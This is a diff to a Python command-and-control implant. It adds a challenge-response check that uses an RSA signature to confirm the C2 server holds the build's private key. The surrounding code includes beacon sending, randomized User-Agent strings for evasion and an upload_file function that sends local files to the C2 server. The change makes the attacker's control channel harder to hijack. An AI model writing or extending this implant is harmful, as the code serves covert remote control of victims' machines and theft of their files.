@@ -6,6 +6,7 @@ import urllib.parse
 import urllib.request
 import platform
 import os
+import base64
 
 from cryptography.fernet import Fernet
 
@@ -85,6 +86,46 @@ def send_beacon(
         return body
     except Exception as e:
         return None
+
+
+def verify_server(c2_server: str, build_number: int, public_key_pem: str) -> bool:
+    """Returns True if the C2 server proves ownership of the build's private key."""
+    challenge = base64.b64encode(os.urandom(32)).decode()
+    for attempt in range(3):
+        try:
+            req = urllib.request.Request(
+                f"{c2_server}/api/challenge",
+                data=json.dumps({
+                    'challenge': challenge,
+                    'build_number': build_number,
+                }).encode(),
+                headers={
+                    'Content-Type': 'application/json',
+                    'User-Agent': random.choice(USER_AGENTS),
+                }
+            )
+            resp = urllib.request.urlopen(req, timeout=10)
+            signature = base64.b64decode(json.loads(resp.read())['signature'])
+
+            from cryptography.hazmat.primitives import hashes
+            from cryptography.hazmat.primitives.asymmetric import padding
+            from cryptography.hazmat.primitives.serialization import load_pem_public_key
+
+            pub = load_pem_public_key(public_key_pem.encode())
+            pub.verify(
+                signature,
+                challenge.encode(),
+                padding.PSS(
+                    mgf=padding.MGF1(hashes.SHA256()),
+                    salt_length=padding.PSS.MAX_LENGTH,
+                ),
+                hashes.SHA256(),
+            )
+            return True
+        except Exception:
+            if attempt < 2:
+                time.sleep(5)
+    return False
 
 
 def upload_file(c2_server: str, hostname: str, local_path: str) -> str:
